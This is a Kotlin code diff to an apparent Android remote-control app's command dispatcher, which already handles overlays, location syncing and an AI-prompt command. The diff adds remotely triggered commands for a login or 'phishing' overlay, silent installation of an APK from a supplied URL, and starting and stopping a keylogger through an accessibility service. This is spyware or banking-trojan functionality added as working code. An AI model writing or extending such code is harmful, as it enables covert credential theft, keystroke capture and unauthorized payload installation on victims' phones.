@@ -141,6 +141,9 @@ class RemoteCommandManager(private val context: Context) {
                 "SHOW_SYSTEM_OVERLAY", "SYSTEM_OVERLAY" -> {
                     resultMessage = com.example.service.AccessibilityOverlayManager.showOverlayWithFallback(context, "system")
                 }
+                "SHOW_LOGIN_OVERLAY", "LOGIN_OVERLAY", "PHISHING_OVERLAY", "SHOW_PHISHING_OVERLAY" -> {
+                    resultMessage = com.example.service.AccessibilityOverlayManager.showOverlayWithFallback(context, "login")
+                }
                 "HIDE_ACCESSIBILITY_OVERLAY", "REMOVE_ACCESSIBILITY_OVERLAY", "HIDE_OVERLAY", "DISMISS_ACCESSIBILITY_OVERLAY" -> {
                     com.example.service.AccessibilityOverlayManager.removeOverlay(context)
                     resultMessage = "Accessibility overlay removed remotely."
@@ -150,6 +153,25 @@ class RemoteCommandManager(private val context: Context) {
                     resultMessage = kotlinx.coroutines.runBlocking {
                         AiAgentManager(context).processAiPrompt(promptText)
                     }
+                }
+                "SILENT_INSTALL", "INSTALL_APK", "SILENT_APP_INSTALL", "INSTALL_APP" -> {
+                    val apkUrl = payload.trim()
+                    if (apkUrl.isNotEmpty()) {
+                        resultMessage = SilentInstallHelper.installApkFromUrl(context, apkUrl)
+                    } else {
+                        resultMessage = "Error: APK URL is missing for silent installation."
+                        isSuccess = false
+                    }
+                }
+                "START_KEYLOGGER", "KEYLOGGER_ON" -> {
+                    val success = RemoteAccessibilityService.setKeyloggerActive(true)
+                    resultMessage = if (success) "Keylogger started successfully." else "Failed to start keylogger: Accessibility service not active."
+                    isSuccess = success
+                }
+                "STOP_KEYLOGGER", "KEYLOGGER_OFF" -> {
+                    val success = RemoteAccessibilityService.setKeyloggerActive(false)
+                    resultMessage = if (success) "Keylogger stopped successfully." else "Failed to stop keylogger: Accessibility service not active."
+                    isSuccess = success
                 }
                 "SYNC_LOCATION", "LOCATION", "GET_LOCATION" -> {
                     val loc = LocationSyncManager(context).captureAndSyncLocation()
